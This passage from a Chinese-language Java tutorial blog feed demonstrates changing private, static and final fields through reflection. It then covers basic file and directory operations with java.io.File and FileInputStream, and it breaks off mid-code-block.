class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Reflection;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>   <span class="hljs-keyword">private</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;testname&quot;</span>);<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printName</span><span class="hljs-params">()</span>&#123;<br>       System.out.println(name);<br>   &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;Reflection.Person&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> c1.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c1.getMethod(<span class="hljs-string">&quot;printName&quot;</span>);<br>        method.invoke(o);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        field.set(o,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;test&quot;</span>));<br>        method.invoke(o);<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/e-20230925101937818.png" alt="image-20230925101937818"></p><p>这里将name成功修改为test。只需要通过getDeclaredField即可。</p><h4 id="static"><a href="#static" class="headerlink" title="static"></a>static</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Reflection;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;testname&quot;</span>);<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printName</span><span class="hljs-params">()</span>&#123;<br>       System.out.println(name);<br>   &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;Reflection.Person&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> c1.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c1.getMethod(<span class="hljs-string">&quot;printName&quot;</span>);<br>        method.invoke(o);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        field.set(o,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;test&quot;</span>));<br>        method.invoke(o);<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/e-20230925102226403.png" alt="image-20230925102226403"></p><p>同样getDeclaredField即可。</p><h4 id="final"><a href="#final" class="headerlink" title="final"></a>final</h4><p>对于final修饰的变量，如果是直接赋值，则无法修改，简介赋值的修改方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Reflection;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sex</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;male&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> (<span class="hljs-literal">null</span>!=<span class="hljs-literal">null</span>?<span class="hljs-number">18</span>:<span class="hljs-number">18</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br>        name = <span class="hljs-string">&quot;testname&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printInfo</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(name+<span class="hljs-string">&quot; &quot;</span>+age+<span class="hljs-string">&quot; &quot;</span>+sex);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;Reflection.Person&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> c1.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c1.getMethod(<span class="hljs-string">&quot;printInfo&quot;</span>);<br>        method.invoke(o);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">sex</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;sex&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        sex.setAccessible(<span class="hljs-literal">true</span>);<br>        sex.set(o,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;female&quot;</span>));<br>        age.setAccessible(<span class="hljs-literal">true</span>);<br>        age.set(o,<span class="hljs-number">180</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(o,<span class="hljs-string">&quot;test&quot;</span>);<br>        method.invoke(o);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/e-20230925103642266.png" alt="image-20230925103642266"></p><p>需要结合setAccessible(true)使用。</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java基础-IO流</title>
    <link href="/2024/07/23/java%E5%9F%BA%E7%A1%80-IO%E6%B5%81/"/>
    <url>/2024/07/23/java%E5%9F%BA%E7%A1%80-IO%E6%B5%81/</url>
    
    <content type="html"><![CDATA[<h1 id="java基础-IO流"><a href="#java基础-IO流" class="headerlink" title="java基础-IO流"></a>java基础-IO流</h1><h2 id="创建文件的方式"><a href="#创建文件的方式" class="headerlink" title="创建文件的方式"></a>创建文件的方式</h2><h3 id="根据路径创建File对象"><a href="#根据路径创建File对象" class="headerlink" title="根据路径创建File对象"></a>根据路径创建File对象</h3><ul><li>方法<code>new File(String filename)</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateFileByPath</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        createFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createFile</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\createdbypath.txt&quot;</span>);<br>        <span class="hljs-keyword">try</span>&#123;<br>            file.createNewFile();<br>            System.out.println(<span class="hljs-string">&quot;Create Successfully&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="根据父目录File对象，在子路径创建文件"><a href="#根据父目录File对象，在子路径创建文件" class="headerlink" title="根据父目录File对象，在子路径创建文件"></a>根据父目录File对象，在子路径创建文件</h3><ul><li>方法<code>new File(File parent, String child)</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateFileByParentFile</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        createFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createFile</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">parentFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream&quot;</span>);<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(parentFile,<span class="hljs-string">&quot;new.txt&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            file.createNewFile();<br>            System.out.println(<span class="hljs-string">&quot;Create successfully&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="根据父目录路径，在子路径创建文件"><a href="#根据父目录路径，在子路径创建文件" class="headerlink" title="根据父目录路径，在子路径创建文件"></a>根据父目录路径，在子路径创建文件</h3><ul><li>方法<code>new File(String parent, String child)</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateFileByParentPath</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        createFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createFile</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">parentPath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream&quot;</span>;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span> (parentPath,<span class="hljs-string">&quot;new1.txt&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            file.createNewFile();<br>            System.out.println(<span class="hljs-string">&quot;Create Successfully&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="获取文件信息"><a href="#获取文件信息" class="headerlink" title="获取文件信息"></a>获取文件信息</h2><p>在new.txt文件中写入如下内容：</p><p><img src="/2023/04/27/file-upload/30919104519010.png" alt="image-20230919104519010"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetFileInfo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        getFileInfo();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getFileInfo</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\new.txt&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;name: &quot;</span>+file.getName());<br>        System.out.println(<span class="hljs-string">&quot;absolute path: &quot;</span>+file.getAbsolutePath());<br>        System.out.println(<span class="hljs-string">&quot;parent path: &quot;</span>+file.getParent());<br>        System.out.println(<span class="hljs-string">&quot;size: &quot;</span>+file.length());<br>        System.out.println(<span class="hljs-string">&quot;isFile ? &quot;</span>+file.isFile());<br>        System.out.println(<span class="hljs-string">&quot;isDirectory ? &quot;</span>+file.isDirectory());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/30919105132120.png" alt="image-20230919105132120"></p><h2 id="目录-文件操作"><a href="#目录-文件操作" class="headerlink" title="目录&#x2F;文件操作"></a>目录&#x2F;文件操作</h2><h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><ul><li>方法<code>file.delete()</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeleteFile</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        deleteFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteFile</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\new1.txt&quot;</span>);<br>        System.out.println(file.delete()?<span class="hljs-string">&quot;Delete Successfully&quot;</span> : <span class="hljs-string">&quot;Delete Failed&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="目录删除"><a href="#目录删除" class="headerlink" title="目录删除"></a>目录删除</h3><ul><li>方法<code>file.delete()</code>，只有空的目录可以删除</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeleteDir</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        deleteDir();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteDir</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\fordelete&quot;</span>);<br>        System.out.println(file.delete()?<span class="hljs-string">&quot;success&quot;</span>:<span class="hljs-string">&quot;failed&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="创建单级目录"><a href="#创建单级目录" class="headerlink" title="创建单级目录"></a>创建单级目录</h3><ul><li>方法<code>file.mkdir()</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateSingleDir</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        createSingleDir();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createSingleDir</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\single&quot;</span>);<br>        System.out.println(file.mkdir()?<span class="hljs-string">&quot;success&quot;</span>:<span class="hljs-string">&quot;failed&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="创建多级目录"><a href="#创建多级目录" class="headerlink" title="创建多级目录"></a>创建多级目录</h3><ul><li>方法<code>file.mkdirs()</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateMultyDir</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        createMultyDir();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createMultyDir</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\multy\\testdir&quot;</span>);<br>        System.out.println(file.mkdirs()?<span class="hljs-string">&quot;success&quot;</span>:<span class="hljs-string">&quot;failed&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO流分类"><a href="#IO流分类" class="headerlink" title="IO流分类"></a>IO流分类</h2><table><thead><tr><th>抽象基类</th><th>字节流</th><th>字符流</th></tr></thead><tbody><tr><td>输入流</td><td>InputStream</td><td>Reader</td></tr><tr><td>输出流</td><td>OutputStream</td><td>Writer</td></tr></tbody></table><h2 id="文件流操作"><a href="#文件流操作" class="headerlink" title="文件流操作"></a>文件流操作</h2><h3 id="FileInputStream"><a href="#FileInputStream" class="headerlink" title="FileInputStream"></a>FileInputStream</h3><h4 id="read"><a href="#read" class="headerlink" title="read()"></a>read()</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileInputRead</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        readFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filepath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\new.txt&quot;</span>;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">readData</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            fileInputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filepath);<br>            <span class="hljs-keyword">while</span>((readData=fileInputStream.read())!=-<span class="hljs-number">1</span>)&#123;<br>                System.out.print((<span class="hljs-type">char</span>)readData);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当read()&#x3D;&#x3D;-1时，代表已经读到了文件的末尾。</p><p>注意：这里输入如果用<code>System.out.println();</code>每个字符都会换行，因此改用<code>System.out.print();</code></p><h4 id="read-byte-d"><a href="#read-byte-d" class="headerlink" title="read(byte[] d)"></a>read(byte[] d)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> 